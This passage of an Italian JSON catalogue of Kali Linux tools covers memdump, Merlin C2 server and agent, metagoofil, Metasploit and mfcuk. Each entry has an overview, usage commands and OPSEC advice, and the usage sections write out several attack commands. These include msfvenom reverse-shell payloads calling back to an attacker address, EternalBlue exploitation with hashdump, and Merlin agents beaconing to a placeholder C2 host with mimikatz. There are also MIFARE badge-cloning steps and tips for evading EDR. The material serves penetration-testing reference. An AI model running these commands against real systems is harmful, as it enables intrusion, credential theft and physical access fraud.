compatibile con tutti i tool di analisi forense: Volatility, Rekall, bulk_extractor. Nessuna manipolazione o compressione dei dati.</p><p><strong>Minimal System Impact:</strong> Tool leggero che non installa driver o modifica il sistema. L'unico effetto è la lettura della memoria, preservando l'integrità forense del sistema sotto analisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Memdump richiede privilegi root per accedere a /dev/mem.</p><pre><code># Dump completo della memoria fisica\nsudo memdump > /mnt/external/memory.raw\n\n# Dump con offset e lunghezza specifici\nsudo memdump -b 0x1000 -l 0x10000000 > partial.raw\n\n# Verifica integrità con hash\nsudo memdump | tee memory.raw | sha256sum > memory.sha256\n\n# Analisi immediata con strings per quick wins\nstrings memory.raw | grep -iE 'password|secret|key|token'\n\n# Ricerca pattern specifici\nstrings memory.raw | grep -E '[A-Za-z0-9+/]{40,}={0,2}' # Base64\n\n# Analisi con Volatility 2\nvol.py -f memory.raw --profile=LinuxUbuntu2004x64 linux_pslist\nvol.py -f memory.raw --profile=LinuxUbuntu2004x64 linux_bash\nvol.py -f memory.raw --profile=LinuxUbuntu2004x64 linux_netstat\n\n# Analisi con Volatility 3\nvol3 -f memory.raw linux.pslist\nvol3 -f memory.raw linux.bash.Bash\n\n# Estrazione bulk di artefatti\nbulk_extractor -o output_dir memory.raw</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Digital Forensics</strong>, il memory dump è uno dei primi step nell'acquisizione di evidenze. La memoria contiene informazioni non reperibili altrove: processi terminati recentemente, connessioni di rete chiuse, e dati di applicazioni non ancora scritti su disco.</p><p>Nel <strong>Incident Response</strong>, quando si risponde a una compromissione, il dump della memoria cattura lo stato del malware in esecuzione: codice, configurazioni, chiavi C2, e credential raccolte. Essenziale per comprendere cosa ha fatto l'attaccante.</p><p>Per <strong>Encryption Key Recovery</strong>, quando si deve accedere a volumi criptati su sistemi live, le chiavi di cifratura sono in memoria. Tool come aeskeyfind e findaes possono estrarre chiavi AES dal dump permettendo decryption dei volumi.</p><p>Nell'<strong>Analisi Malware</strong>, malware fileless e packed binaries esistono solo in memoria. Il dump permette di estrarre codice unpacked, configuration blobs, e identificare tecniche di evasion usate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Privilegi Root:</strong> Richiede accesso root per leggere /dev/mem. Su kernel moderni (post-2.6.26), /dev/mem è spesso limitato al primo MB per motivi di sicurezza. Alternativa: usare LiME (Linux Memory Extractor) come kernel module.</p><p><strong>Kernel Restrictions:</strong> CONFIG_STRICT_DEVMEM e Secure Boot possono bloccare completamente l'accesso a /dev/mem. Su sistemi hardened, LiME o acquisizione hardware sono le uniche opzioni.</p><p><strong>Volatilità dei Dati:</strong> La memoria cambia continuamente. Processi che allocano/deallocano, garbage collection, e operazioni di sistema modificano il contenuto durante l'acquisizione. Minimizzare attività sul sistema durante il dump.</p><p><strong>Integrità Forense:</strong> L'esecuzione di memdump stesso modifica la memoria (caricamento binario, allocazioni). Per massima integrità forense, considerare acquisizione hardware (DMA via FireWire/Thunderbolt) o snapshot di VM.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "merlin-agent",
    "name": "merlin-agent",
    "version": "2.4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/merlin-agent/",
    "desc": "Agent cross-platform per C2 Merlin con comunicazione HTTP/2 e H2C.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Merlin Agent</strong> e il componente implant del framework C2 (Command and Control) Merlin, sviluppato interamente in Go per garantire portabilita nativa su Windows, Linux e macOS senza dipendenze esterne. L'agent comunica con il server Merlin utilizzando protocolli HTTP/2 e H2C (HTTP/2 Cleartext), sfruttando le caratteristiche avanzate del protocollo come multiplexing delle connessioni, compressione degli header e crittografia TLS integrata. Questa scelta protocollare permette al traffico C2 di mimetizzarsi come normale traffico web moderno, rendendo piu difficile l'identificazione tramite analisi del traffico di rete. Una volta eseguito su un sistema target, l'agent stabilisce un canale di comunicazione persistente con il server, ricevendo ed eseguendo comandi, caricando moduli aggiuntivi e restituendo i risultati delle operazioni al controllore.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Comunicazione HTTP/2 e H2C:</strong> L'agent utilizza HTTP/2 come protocollo di trasporto principale, beneficiando del multiplexing che permette di inviare e ricevere dati simultaneamente su una singola connessione TCP. La modalita H2C fornisce un'alternativa per ambienti dove l'ispezione TLS e presente, utilizzando HTTP/2 in chiaro. Il protocollo supporta anche fallback a HTTP/1.1 per massimizzare la compatibilita con proxy e firewall aziendali.</p><p><strong>Portabilita cross-platform nativa:</strong> Essendo compilato in Go, l'agent produce un singolo binario statico per ogni piattaforma target senza richiedere runtime o librerie aggiuntive. Questo semplifica enormemente il deployment e riduce la superficie di detection, poiche non servono file di supporto sul filesystem. L'agent supporta le stesse funzionalita su tutte le piattaforme, inclusa l'esecuzione di comandi, il trasferimento file e il caricamento di moduli.</p><p><strong>Moduli runtime e funzionalita post-exploitation:</strong> L'agent puo caricare ed eseguire moduli aggiuntivi a runtime per estendere le proprie capacita. Questi includono moduli per l'esecuzione di shellcode, iniezione in processi, mimikatz integration su Windows, port forwarding e pivoting. Il caricamento dinamico permette di mantenere l'agent iniziale leggero e di aggiungere funzionalita solo quando necessario, riducendo la firma iniziale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'agent viene generato dal server Merlin con parametri specifici per il target e la configurazione di comunicazione desiderata. Una volta trasferito ed eseguito sul sistema target, si connette automaticamente al server.</p><pre><code># Generazione dell'agent dal server Merlin\nmerlin> use module/payload/create\nmerlin> set PAYLOAD windows/x64/merlin\nmerlin> set URL https://c2.example.com:443\nmerlin> set PSK mysecretkey\nmerlin> run\n\n# Esecuzione dell'agent sul target Windows\nmerlinAgent.exe -url https://c2.example.com:443 -psk mysecretkey\n\n# Esecuzione su target Linux\n./merlinAgent -url https://c2.example.com:443 -psk mysecretkey\n\n# Configurazione beacon interval personalizzato\n./merlinAgent -url https://c2.example.com:443 -sleep 30s -skew 10\n\n# Interazione dal server dopo la connessione\nmerlin> sessions\nmerlin> interact SESSION_ID\nmerlin> shell whoami</code></pre><p>Il parametro -psk specifica la chiave precondivisa per la crittografia aggiuntiva del canale. Il parametro -sleep controlla l'intervallo tra i check-in e -skew aggiunge jitter casuale per evitare pattern temporali prevedibili. E fondamentale configurare questi parametri in base al livello di stealth richiesto dall'operazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nelle operazioni di <strong>red team</strong>, Merlin Agent viene deployato sui sistemi compromessi per stabilire un canale C2 persistente e affidabile. L'uso di HTTP/2 permette di attraversare la maggior parte dei firewall aziendali che consentono traffico HTTPS, mentre il multiplexing garantisce comunicazioni efficienti anche con beacon interval lunghi. Per <strong>post-exploitation cross-platform</strong>, quando l'engagement coinvolge sistemi eterogenei (server Linux, workstation Windows, laptop macOS), l'agent fornisce un'interfaccia unificata di controllo attraverso il server Merlin, semplificando la gestione di operazioni complesse. In scenari di <strong>persistence e long-term access</strong>, l'agent puo essere configurato con beacon interval elevati e jitter casuale per mantenere accesso a lungo termine minimizzando il traffico di rete e riducendo la probabilita di detection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il binario Go ha una dimensione relativamente grande e una struttura caratteristica che puo essere identificata da soluzioni antivirus e EDR. Le signature dell'agent Merlin sono presenti nei database di molti vendor di sicurezza. Il traffico HTTP/2, sebbene comune, puo essere sottoposto ad analisi specifica se diretto verso destinazioni insolite. I pattern di beacon, anche con jitter, possono essere identificati tramite analisi statistica del traffico.</p><p><strong>Impatto operativo:</strong> L'esecuzione di un nuovo processo puo generare alert in ambienti con monitoraggio avanzato. Su Windows, l'assenza di firma digitale valida e un indicatore di sospetto. Il caricamento di moduli a runtime genera attivita in memoria che puo essere rilevata da soluzioni di memory scanning. La comunicazione con server C2 esterni e soggetta a ispezione da parte di proxy e firewall next-generation.</p><p><strong>Mitigazioni:</strong> Personalizzare il binario dell'agent modificando stringhe identificative e metadata prima della compilazione. Utilizzare certificate pinning per impedire l'intercettazione del traffico. Configurare jitter significativo (30-50%) per rendere i pattern di beacon meno prevedibili. Utilizzare domain fronting o redirector per nascondere l'indirizzo reale del server C2. Considerare l'iniezione dell'agent in processi legittimi piuttosto che l'esecuzione come processo standalone.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "merlin",
    "name": "merlin",
    "version": "2.1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/merlin/",
    "desc": "C2 server cross-platform in Go con HTTP/2 per comunicazioni criptate e performanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Merlin</strong> e un framework Command and Control (C2) moderno e cross-platform sviluppato interamente in Go. Progettato come alternativa contemporanea a framework legacy come Empire e Cobalt Strike, Merlin utilizza HTTP/2 come protocollo di trasporto principale per comunicazioni criptate ad alte prestazioni tra server e agent. Il framework include un server con interfaccia CLI interattiva, agent compilabili per Windows, Linux e macOS, e un ecosistema di moduli per operazioni di post-exploitation. La scelta di Go come linguaggio garantisce portabilita nativa, compilazione statica e prestazioni elevate sia per il server che per gli agent. Merlin supporta listener multipli, gestione simultanea di sessioni e un sistema modulare estensibile per adattarsi a diversi scenari operativi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Server con interfaccia CLI interattiva:</strong> Il server Merlin fornisce una console interattiva ispirata a Metasploit che permette di gestire listener, sessioni, moduli e operazioni. L'interfaccia supporta completamento automatico, cronologia dei comandi e un sistema di help contestuale. I listener possono essere configurati su porte e protocolli diversi, e il server puo gestire centinaia di sessioni simultanee con overhead minimo grazie alla concorrenza nativa di Go.</p><p><strong>Comunicazione HTTP/2 con multiplexing:</strong> L'uso di HTTP/2 come protocollo di trasporto offre vantaggi significativi rispetto ai tradizionali canali C2 basati su HTTP/1.1. Il multiplexing permette di inviare comandi e ricevere risultati simultaneamente su una singola connessione, la compressione degli header riduce la dimensione del traffico, e la crittografia TLS e nativa nel protocollo. Questo rende il traffico C2 indistinguibile dal normale traffico web HTTPS per la maggior parte dei sistemi di ispezione.</p><p><strong>Sistema modulare per post-exploitation:</strong> Merlin include moduli per le operazioni piu comuni di post-exploitation, organizzati per piattaforma e funzionalita. I moduli Windows includono integrazione con Mimikatz per credential dumping, esecuzione di shellcode e iniezione in processi. Moduli cross-platform forniscono funzionalita di file transfer, port forwarding, screenshot e keylogging. Il sistema modulare e estensibile e nuovi moduli possono essere aggiunti senza modificare il core del framework.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Merlin si avvia da riga di comando e presenta un'interfaccia interattiva per la configurazione di listener, la generazione di agent e la gestione delle sessioni attive.</p><pre><code># Avvio del server Merlin\nmerlin\n\n# Configurazione di un listener HTTP/2\nmerlin> use listener/http2\nmerlin> set Interface 0.0.0.0\nmerlin> set Port 443\nmerlin> set PSK mysecretpassword\nmerlin> start\n\n# Generazione di un agent per Windows\nmerlin> use module/payload/create\nmerlin> set OS windows\nmerlin> set ARCH x64\nmerlin> set URL https://c2.example.com:443\nmerlin> run\n\n# Gestione delle sessioni\nmerlin> sessions\nmerlin> interact SESSION_UUID\nmerlin> shell whoami\nmerlin> upload /local/file /remote/path\nmerlin> use module/credentials/mimikatz\nmerlin> run</code></pre><p>Il comando PSK imposta la chiave precondivisa utilizzata per la crittografia aggiuntiva del canale di comunicazione. E fondamentale utilizzare una chiave forte e unica per ogni engagement. I listener possono essere configurati con certificati TLS personalizzati per aumentare la credibilita del traffico.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per operazioni di <strong>red team strutturate</strong>, Merlin fornisce un'infrastruttura C2 completa che supporta l'intero ciclo di vita dell'engagement, dall'accesso iniziale alla post-exploitation avanzata. La gestione centralizzata di sessioni multiple su piattaforme diverse semplifica il coordinamento di operazioni complesse su infrastrutture eterogenee. Come <strong>strumento di formazione per offensive security</strong>, Merlin offre un framework open source ben documentato per studiare architetture C2, protocolli di comunicazione e tecniche di post-exploitation. Gli studenti possono analizzare il codice sorgente, modificare i moduli e sperimentare con configurazioni diverse in ambienti di laboratorio. Per <strong>validazione di detection capabilities</strong>, i blue team possono utilizzare Merlin per generare traffico C2 realistico e verificare che i propri strumenti di monitoraggio (EDR, NDR, SIEM) siano in grado di rilevare e alertare sulle comunicazioni e sulle attivita post-exploitation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le signature di Merlin sono presenti nei database di molti vendor antivirus e EDR. Il traffico HTTP/2, sebbene crittografato, presenta pattern identificabili come JA3 fingerprint del client Go e timing dei beacon. L'analisi dei certificati TLS utilizzati dal listener puo rivelare l'uso di certificati autofirmati o con attributi sospetti. I moduli di post-exploitation come Mimikatz generano attivita in memoria che le soluzioni EDR moderne possono rilevare.</p><p><strong>Impatto operativo:</strong> Il server Merlin necessita di un'infrastruttura dedicata esposta su Internet, che deve essere protetta e mantenuta per tutta la durata dell'engagement. La perdita del server comporta la perdita di tutte le sessioni attive. Il traffico C2 attraversa la rete del target e puo essere registrato da dispositivi di sicurezza perimetrali per analisi forensi successive.</p><p><strong>Mitigazioni:</strong> Utilizzare redirector e domain fronting per nascondere l'indirizzo reale del server C2. Configurare certificati TLS validi emessi da CA riconosciute per evitare alert su certificati autofirmati. Personalizzare il JA3 fingerprint del client modificando i parametri TLS. Implementare kill dates negli agent per limitare l'esposizione temporale. Utilizzare infrastruttura effimera e facilmente ricostruibile per il server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "metagoofil",
    "name": "metagoofil",
    "version": "1.2.0",
    "icon": "../app/icons/metagoofil-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/metagoofil/",
    "desc": "Estrae metadati da documenti pubblici (PDF, DOC) per trovare username e software.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Metagoofil</strong> e uno strumento di information gathering che estrae metadati da documenti pubblici associati a un dominio target. Utilizzando Google come motore di ricerca, individua e scarica automaticamente documenti in formati comuni come PDF, DOC, XLS, PPT e ODT pubblicati dall'organizzazione target. Successivamente analizza i metadati embedded in questi file per estrarre informazioni preziose come nomi utente, indirizzi email, percorsi di directory interni, versioni del software utilizzato e nomi dei server. Queste informazioni, apparentemente innocue quando inserite nei documenti, rappresentano una miniera d'oro per un attaccante in fase di ricognizione, fornendo dettagli sull'infrastruttura interna, sulle convenzioni di naming e sul software in uso nell'organizzazione target senza alcun contatto diretto con i sistemi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Ricerca automatica di documenti via Google:</strong> Metagoofil utilizza Google dorking per individuare documenti associati al dominio target. Lo strumento costruisce automaticamente query di ricerca specifiche per ogni tipo di file supportato e scarica i risultati fino al limite configurato. E possibile specificare il numero massimo di risultati da analizzare e il numero di documenti da scaricare, permettendo di bilanciare completezza e tempo di esecuzione.</p><p><strong>Estrazione multi-formato di metadati:</strong> Lo strumento analizza documenti in molteplici formati inclusi PDF (metadati XMP e Dublin Core), documenti Microsoft Office (DOC, DOCX, XLS, XLSX, PPT, PPTX) e formati OpenDocument. Per ogni formato, estrae autore, titolo, oggetto, commenti, date di creazione e modifica, software utilizzato per la creazione, versione del software, e percorsi di directory incorporati nei riferimenti interni del documento.</p><p><strong>Correlazione e reportistica dei risultati:</strong> I metadati estratti vengono correlati e organizzati per categoria, fornendo un quadro complessivo dell'organizzazione. Lo strumento raggruppa i nomi utente trovati, identifica i software e le relative versioni in uso, e mappa i percorsi interni dei file server. Questa aggregazione trasforma dati frammentari da singoli documenti in intelligence azionabile per le fasi successive dell'engagement.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Metagoofil si utilizza specificando il dominio target, i tipi di file da cercare e i parametri di ricerca. I documenti vengono scaricati in una directory locale e analizzati automaticamente.</p><pre><code># Ricerca e analisi di PDF e documenti Office\nmetagoofil -d target.com -t pdf,doc,docx,xls,pptx -l 200 -n 50 -o /tmp/metagoofil_output/\n\n# Solo documenti PDF con piu risultati\nmetagoofil -d target.com -t pdf -l 500 -n 100 -o /tmp/pdf_analysis/\n\n# Analisi rapida con pochi risultati\nmetagoofil -d target.com -t pdf,doc -l 50 -n 20 -o /tmp/quick_scan/\n\n# Fogli di calcolo per trovare naming convention\nmetagoofil -d target.com -t xls,xlsx -l 100 -n 30 -o /tmp/excel_meta/</code></pre><p>Il parametro -l controlla il numero massimo di risultati Google da analizzare, mentre -n limita il numero di documenti effettivamente scaricati. La directory di output specificata con -o conterra sia i documenti scaricati che il report dei metadati estratti. Google puo implementare rate limiting o CAPTCHA se si effettuano troppe ricerche in poco tempo; in tal caso e consigliabile distanziare le sessioni di ricerca.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>OSINT e raccolta informazioni</strong>, Metagoofil rivela dettagli sull'organizzazione target che non sarebbero altrimenti visibili. I nomi utente estratti dai documenti possono rivelare la convenzione di naming dell'azienda (nome.cognome, iniziale.cognome, etc.), permettendo di costruire liste di username validi per successive fasi di attacco. Per la preparazione di campagne di <strong>social engineering</strong>, i nomi degli autori dei documenti forniscono target specifici per phishing mirato, mentre le informazioni sul software in uso permettono di creare pretesti credibili o payload specifici per le versioni identificate. Nell'ambito dell'<strong>attack surface assessment</strong>, le versioni del software rivelate dai metadati (come Adobe Acrobat, Microsoft Office, sistemi operativi) permettono di identificare potenziali vulnerabilita note e i percorsi di directory interni forniscono informazioni sulla struttura del file system aziendale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Metagoofil e uno strumento prevalentemente passivo poiche interagisce con Google e non direttamente con l'infrastruttura del target. I documenti analizzati sono pubblicamente accessibili sul web. Tuttavia, il download massivo di documenti dal dominio target attraverso link diretti puo essere registrato nei log del web server dell'organizzazione, specialmente se i documenti sono ospitati su server proprietari.</p><p><strong>Impatto operativo:</strong> Google implementa meccanismi anti-bot che possono bloccare le ricerche automatizzate dopo un certo numero di query, richiedendo la risoluzione di CAPTCHA o imponendo attese. L'analisi di un gran numero di documenti richiede spazio su disco e tempo di elaborazione significativi. I metadati estratti possono contenere informazioni datate se i documenti sono vecchi.</p><p><strong>Mitigazioni:</strong> Distanziare le sessioni di ricerca nel tempo per evitare i meccanismi anti-bot di Google. Utilizzare VPN o proxy per mascherare l'indirizzo IP durante il download dei documenti. Verificare sempre l'attualita delle informazioni estratte confrontandole con altre fonti OSINT. Eliminare i documenti scaricati al termine dell'analisi per evitare l'accumulo di dati potenzialmente sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Metadata"
    ],
    "notes": null
  },
  {
    "id": "metasploit-framework-kali",
    "name": "metasploit-framework",
    "version": "6.4.84",
    "icon": "../app/icons/metasploit-framework-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/metasploit-framework/",
    "desc": "Il framework di exploitation più famoso con migliaia di exploit, payload e moduli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Metasploit Framework</strong> e il framework di exploitation piu utilizzato e riconosciuto al mondo nel campo della sicurezza informatica offensiva. Sviluppato originariamente da HD Moore nel 2003 e ora mantenuto da Rapid7, include migliaia di exploit per vulnerabilita note, centinaia di payload per diversi sistemi operativi, encoder per evasione, moduli di post-exploitation e strumenti ausiliari per reconnaissance e scanning. Il framework fornisce msfconsole come interfaccia interattiva principale, msfvenom per la generazione standalone di payload, e integrazione nativa con database PostgreSQL per la gestione strutturata di host, servizi, vulnerabilita e credenziali durante engagement complessi. Metasploit rappresenta lo standard de facto per penetration testing e viene utilizzato sia da professionisti della sicurezza che in ambito accademico e formativo.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Libreria di exploit e payload:</strong> Il framework include oltre 2000 exploit per vulnerabilita in sistemi operativi, applicazioni web, servizi di rete e dispositivi embedded. I payload disponibili spaziano da semplici reverse shell a Meterpreter, un agent avanzato con funzionalita di file system access, screenshot, keylogging, pivoting e privilege escalation. Il sistema di encoder permette di offuscare i payload per tentare di evadere i controlli antivirus, mentre i NOP generator garantiscono l'allineamento corretto dello shellcode.</p><p><strong>Post-exploitation e Meterpreter:</strong> Meterpreter e il payload di punta di Metasploit, un agent in-memory che non tocca il disco e fornisce un'ampia gamma di funzionalita post-exploitation. Include moduli per credential harvesting (hashdump, kiwi/mimikatz), privilege escalation (getsystem, local exploits), lateral movement (port forwarding, pivoting), persistence e raccolta informazioni. La comunicazione tra Meterpreter e il framework e crittografata e supporta trasporti multipli inclusi TCP, HTTP e HTTPS.</p><p><strong>Database e gestione dell'engagement:</strong> L'integrazione con PostgreSQL permette di salvare e organizzare tutte le informazioni raccolte durante un penetration test. Host scoperti, servizi identificati, vulnerabilita trovate, credenziali ottenute e sessioni attive vengono tracciati automaticamente nel database. Questo facilita la correlazione dei dati, la generazione di report e la collaborazione tra membri del team. Il workspace system permette di gestire engagement multipli separatamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Metasploit si utilizza principalmente attraverso msfconsole, un'interfaccia interattiva potente e flessibile. Il workflow tipico prevede la selezione di un exploit, la configurazione dei parametri e l'esecuzione contro il target.</p><pre><code># Avvio di msfconsole con database\nmsfdb init && msfconsole\n\n# Ricerca e utilizzo di un exploit\nmsf6> search type:exploit name:eternalblue\nmsf6> use exploit/windows/smb/ms17_010_eternalblue\nmsf6> set RHOSTS 192.168.1.0/24\nmsf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6> set LHOST 10.0.0.1\nmsf6> exploit\n\n# Operazioni Meterpreter dopo exploitation\nmeterpreter> sysinfo\nmeterpreter> hashdump\nmeterpreter> upload /local/tool.exe C:\\\\temp\\\\tool.exe\nmeterpreter> run post/multi/manage/autoroute\n\n# Generazione payload con msfvenom\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o shell.exe\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf</code></pre><p>E fondamentale configurare correttamente LHOST (indirizzo locale per la callback) e verificare che il payload sia compatibile con l'architettura del target. Il comando 'check' disponibile per alcuni exploit permette di verificare la vulnerabilita senza eseguire l'exploit. Il database integrato traccia automaticamente tutte le operazioni eseguite.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>penetration testing professionale</strong>, Metasploit e lo strumento centrale per la fase di exploitation. Dopo aver identificato vulnerabilita tramite scanner come Nessus o OpenVAS, il pentester utilizza Metasploit per verificare e sfruttare le vulnerabilita, ottenere accesso ai sistemi e dimostrare l'impatto reale delle falle di sicurezza al cliente. Per operazioni di <strong>red team e adversary simulation</strong>, il framework fornisce capacita complete di post-exploitation incluse privilege escalation, lateral movement, credential harvesting e persistence, permettendo di simulare l'intera kill chain di un attaccante sofisticato in un ambiente controllato. In ambito <strong>formativo e CTF</strong>, Metasploit e lo strumento di riferimento per imparare le tecniche di exploitation e per risolvere challenge in competizioni Capture The Flag, grazie alla sua documentazione estesa e alla vasta comunita di supporto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Metasploit e il framework piu conosciuto e le sue signature sono presenti in tutti i database antivirus e EDR commerciali. Meterpreter, pur operando in memoria, e altamente detectato da soluzioni endpoint moderne attraverso analisi comportamentale e memory scanning. I pattern di traffico di rete dei payload Metasploit sono documentati e riconosciuti da IDS/IPS come Snort e Suricata. Gli exploit stessi generano attivita di rete caratteristiche facilmente identificabili.</p><p><strong>Impatto operativo:</strong> L'utilizzo di exploit puo causare crash dei servizi target se l'exploit fallisce o se il target non e nella versione esatta attesa. Meterpreter lascia tracce in memoria che possono essere recuperate con analisi forense. Le connessioni di callback sono registrate nei log di rete e possono essere tracciate. L'uso di moduli di post-exploitation come hashdump e mimikatz genera eventi di sicurezza specifici nei log di Windows.</p><p><strong>Mitigazioni:</strong> Utilizzare payload staged con trasporti HTTPS per crittografare il traffico. Applicare encoding e encryption personalizzati ai payload tramite msfvenom o strumenti di terze parti per evadere i controlli signature-based. Preferire operazioni in memoria ed evitare di scrivere file su disco. Utilizzare sleep e jitter nelle sessioni Meterpreter per ridurre i pattern di traffico. Considerare framework C2 alternativi con signature meno note per engagement in ambienti altamente monitorati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "mfcuk",
    "name": "mfcuk",
    "version": "0.3.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfcuk/",
    "desc": "Cracca chiavi MIFARE Classic usando attacco darkside per card cloning RFID.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MFCUK</strong> (MIFARE Classic Universal toolKit) è un tool specializzato per il cracking di chiavi su card MIFARE Classic 1K e 4K utilizzando l'attacco \"darkside\". Questo attacco sfrutta una debolezza fondamentale nel generatore di numeri pseudo-casuali (PRNG) del chip MIFARE, permettendo di recuperare chiavi di autenticazione senza conoscerne nessuna in partenza. MIFARE Classic è ampiamente utilizzata in badge di accesso aziendale, trasporto pubblico (biglietti contactless), e sistemi di pagamento. MFCUK è tipicamente il primo tool da usare quando si affronta una card completamente sconosciuta, per ottenere almeno una chiave che poi permette di utilizzare mfoc per l'attacco nested e recuperare tutte le altre.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Darkside Attack Implementation:</strong> Implementa l'attacco darkside scoperto nel 2008 da de Koning Gans. Sfrutta il PRNG debole del chip CRYPTO1 che usa solo 16 bit di entropia. Inviando comandi malformati e analizzando le risposte, deduce progressivamente i bit della chiave.</p><p><strong>Zero Knowledge Recovery:</strong> Non richiede alcuna chiave nota per iniziare. Questo lo distingue da mfoc che necessita almeno una chiave. MFCUK funziona su card dove tutte le chiavi sono state cambiate dai default.</p><p><strong>PRNG Weakness Exploitation:</strong> Il PRNG di MIFARE Classic si resetta prevedibilmente ad ogni power-up della card. MFCUK manipola timing e sequenza delle operazioni per sfruttare stati PRNG noti e ridurre lo spazio di ricerca delle chiavi.</p><p><strong>Foundation for Full Dump:</strong> Una volta ottenuta una singola chiave con MFCUK, il tool mfoc può usarla per eseguire l'attacco nested e recuperare rapidamente tutte le altre 31 chiavi (16 settori × 2 chiavi per settore su MIFARE 1K).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MFCUK richiede un lettore NFC compatibile (tipicamente ACR122U o PN532).</p><pre><code># Attacco darkside base - recupera prima chiave\nmfcuk -C -R 0 -s 250 -S 250\n\n# -C: continua automaticamente dopo recovery\n# -R 0: target sector 0 (spesso ha chiavi default)\n# -s/-S: sample size per stabilità\n\n# Attacco con verbose output per debug\nmfcuk -C -R 0 -s 250 -S 250 -v 2\n\n# Specificare settore target diverso\nmfcuk -C -R 8 -s 250 -S 250\n\n# Output tipico:\n# Trying sector 0, keytype A\n# Found Key: FFFFFFFFFFFF\n# o\n# Found Key: A0B1C2D3E4F5\n\n# Workflow completo dopo MFCUK:\n# 1. Ottieni prima chiave con mfcuk\nmfcuk -C -R 0 -s 250 -S 250\n\n# 2. Usa la chiave trovata con mfoc per dump completo\nmfoc -O card_dump.mfd\n# mfoc usa automaticamente la chiave trovata\n\n# 3. Scrivi dump su card clone\nnfc-mfclassic w a blank_card.mfd card_dump.mfd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Physical Security Assessment</strong>, MFCUK testa la sicurezza dei badge di accesso aziendali. Se le chiavi possono essere recuperate, l'intero sistema di controllo accessi basato su MIFARE Classic è compromesso.</p><p>Nel <strong>Physical Penetration Testing</strong>, dopo aver ottenuto brevemente accesso fisico a un badge (anche per pochi secondi), MFCUK può avviare il recovery delle chiavi permettendo la successiva clonazione completa.</p><p>Per <strong>Security Research</strong>, MFCUK è lo strumento standard per dimostrare la debolezza intrinseca di MIFARE Classic. Usato in paper accademici e presentazioni per illustrare perché questa tecnologia non dovrebbe essere usata per applicazioni sensibili.</p><p>Nel <strong>Lost Key Recovery</strong>, per sistemi legittimamente posseduti dove le chiavi sono state perse, MFCUK permette di recuperare l'accesso ai dati stored sulla card.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Fisico Richiesto:</strong> La card deve essere posizionata sul lettore NFC durante l'attacco. Il processo richiede da pochi secondi a diversi minuti. In scenari real-world, questo può richiedere social engineering per ottenere il badge temporaneamente.</p><p><strong>Hardware Specifico:</strong> Richiede lettore NFC compatibile con libnfc. ACR122U è il più comune e testato. Lettori integrati in laptop spesso non funzionano. PN532 boards sono alternativa economica.</p><p><strong>Legalità:</strong> Clonare badge di accesso senza autorizzazione è illegale nella maggior parte delle giurisdizioni. Può costituire reato di violazione di domicilio, frode informatica, o accesso abusivo a sistemi. Utilizzare solo in contesti autorizzati di security testing.</p><p><strong>Detection:</strong> L'attacco stesso non lascia tracce sulla card o sui log del sistema di controllo accessi. Tuttavia, l'uso successivo di una card clonata può essere rilevato se il sistema confronta altri identificatori (timestamp, sequenza, etc.).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
